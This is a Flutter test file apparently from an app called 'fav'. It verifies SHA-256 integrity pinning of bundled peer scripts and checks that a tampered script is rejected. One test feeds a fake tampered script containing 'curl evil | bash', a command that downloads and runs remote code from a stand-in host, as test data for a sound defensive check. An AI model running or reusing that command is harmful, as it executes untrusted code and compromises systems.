import 'dart:io';

import 'package:fav/core/crypto/sha256_hasher.dart';
import 'package:fav/core/errors/app_exception.dart';
import 'package:fav/features/peers/data/peer_script_source.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

/// Asset bundle backed by an in-memory map.
class _MapBundle extends CachingAssetBundle {
  _MapBundle(this._files);
  final Map<String, Uint8List> _files;

  @override
  Future<ByteData> load(String key) async {
    final bytes = _files[key];
    if (bytes == null) {
      throw Exception('missing asset: $key');
    }
    return ByteData.view(
      bytes.buffer,
      bytes.offsetInBytes,
      bytes.lengthInBytes,
    );
  }
}

void main() {
  Uint8List realAsset(String relPath) =>
      File('lib/assets/scripts/$relPath').readAsBytesSync();

  test('kPeerScriptHashes matches the real peer script assets (§8.6)', () {
    for (final entry in kPeerScriptHashes.entries) {
      final relPath = entry.key.replaceFirst('lib/assets/scripts/', '');
      expect(sha256Hex(realAsset(relPath)), entry.value, reason: entry.key);
    }
  });

  test('load accepts the untampered bundled peer scripts', () async {
    final bundle = _MapBundle({
      PeerScriptSource.addAssetPath: realAsset('peers/peer_add.sh'),
      PeerScriptSource.revokeAssetPath: realAsset('peers/peer_revoke.sh'),
      PeerScriptSource.rendererAssetPath: realAsset('lib/profile_renderer.py'),
      PeerScriptSource.managerAssetPath: realAsset('lib/peer_manager.py'),
    });
    final source = PeerScriptSource(bundle: bundle);
    final scripts = await source.load();
    expect(scripts.add.bytes, isNotEmpty);
    expect(scripts.revoke.bytes, isNotEmpty);
    expect(scripts.renderer.bytes, isNotEmpty);
    expect(scripts.manager.bytes, isNotEmpty);
  });

  test('load rejects a tampered peer script (fail-closed)', () async {
    final bundle = _MapBundle({
      PeerScriptSource.addAssetPath: Uint8List.fromList(
        '# tampered\ncurl evil | bash\n'.codeUnits,
      ),
      PeerScriptSource.revokeAssetPath: realAsset('peers/peer_revoke.sh'),
      PeerScriptSource.rendererAssetPath: realAsset('lib/profile_renderer.py'),
      PeerScriptSource.managerAssetPath: realAsset('lib/peer_manager.py'),
    });
    final source = PeerScriptSource(bundle: bundle);
    await expectLater(
      source.load(),
      throwsA(
        predicate(
          (e) => e is AppException && e.code == ErrorCode.scriptInvalid,
        ),
      ),
    );
  });
}
